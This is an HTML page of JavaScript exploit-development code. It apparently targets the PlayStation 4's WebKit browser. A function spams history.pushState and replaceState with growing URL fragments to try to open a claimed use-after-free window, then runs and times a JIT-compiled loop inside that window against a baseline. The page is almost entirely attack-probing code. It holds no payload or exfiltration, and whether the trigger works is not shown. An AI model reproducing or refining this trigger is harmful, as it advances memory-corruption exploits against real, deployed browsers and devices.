<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – JIT × UAF Correlation Probe</title>
<style>
body {
  font-family: monospace;
  background: #000;
  color: #0f0;
  padding: 20px;
}
button {
  padding: 12px 20px;
  font-size: 16px;
  margin: 8px 0;
  cursor: pointer;
}
#log {
  white-space: pre-wrap;
  margin-top: 15px;
  border: 1px solid #0f0;
  padding: 10px;
  max-height: 500px;
  overflow-y: auto;
}
.critical { color: #f00; }
.warn { color: #ff0; }
</style>
</head>

<body>
<h2>PS4 WebKit – JIT × UAF Temporal Correlation</h2>

<button onclick="runBaseline()">1️⃣ Baseline JIT (NO UAF)</button>
<button onclick="runUAF_JIT()">2️⃣ JIT During UAF Window</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){
  const s = document.createElement("span");
  if(cls) s.className = cls;
  s.textContent = m + "\n";
  logEl.appendChild(s);
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// -------------------------------------------------
// JIT TARGET FUNCTION
// -------------------------------------------------
function jitTarget(arr){
  let acc = 0;
  for(let i=0;i<1024;i++){
    acc ^= arr[i & 31];
  }
  return acc;
}

// Warmup to force JIT
function warmupJIT(arr){
  for(let i=0;i<50000;i++){
    jitTarget(arr);
  }
}

// -------------------------------------------------
// BASELINE TEST (NO UAF)
// -------------------------------------------------
async function runBaseline(){
  logEl.textContent = "";
  log("=== BASELINE JIT TEST ===");

  let arr = new Uint32Array(32);
  for(let i=0;i<arr.length;i++) arr[i] = 0x41414141;

  warmupJIT(arr);
  log("[BASE] JIT warmed");

  let results = [];
  for(let i=0;i<10;i++){
    let t0 = performance.now();
    let r = jitTarget(arr);
    let t1 = performance.now();
    results.push({ r, dt:(t1-t0).toFixed(3) });
    log(`[BASE] Run ${i}: result=0x${r.toString(16)} time=${(t1-t0).toFixed(3)}ms`);
    await sleep(10);
  }

  log("=== BASELINE END ===");
}

// -------------------------------------------------
// UAF TRIGGER (CORRECT VERSION)
// -------------------------------------------------
async function triggerUAF(){
  let size = 977;
  const STEP = 14461;

  log("=== UAF TRIGGER START ===", "warn");

  for(let i=0;i<48;i++){
    let frag = "A".repeat(size);
    history.pushState({}, "", "#"+frag);
    history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
    if(i % 6 === 0)
      setTimeout(()=>history.back(),0);
    size += STEP;
    await sleep(5);
  }

  log(">>> UAF WINDOW <<<", "critical");
}

// -------------------------------------------------
// JIT EXECUTED DURING UAF WINDOW
// -------------------------------------------------
async function runUAF_JIT(){
  logEl.textContent = "";
  log("=== JIT × UAF TEST ===");

  let arr = new Uint32Array(32);
  for(let i=0;i<arr.length;i++) arr[i] = 0x41414141;

  warmupJIT(arr);
  log("[UAF] JIT warmed (pre-UAF)");

  await triggerUAF();
  await sleep(120); // stay inside window

  log("[UAF] Executing JIT inside window", "warn");

  for(let i=0;i<10;i++){
    let t0 = performance.now();
    let r = jitTarget(arr);
    let t1 = performance.now();
    log(`[UAF] Run ${i}: result=0x${r.toString(16)} time=${(t1-t0).toFixed(3)}ms`);
    await sleep(10);
  }

  log("=== UAF TEST END ===");
}

log("Ready.");
</script>
</body>
</html>
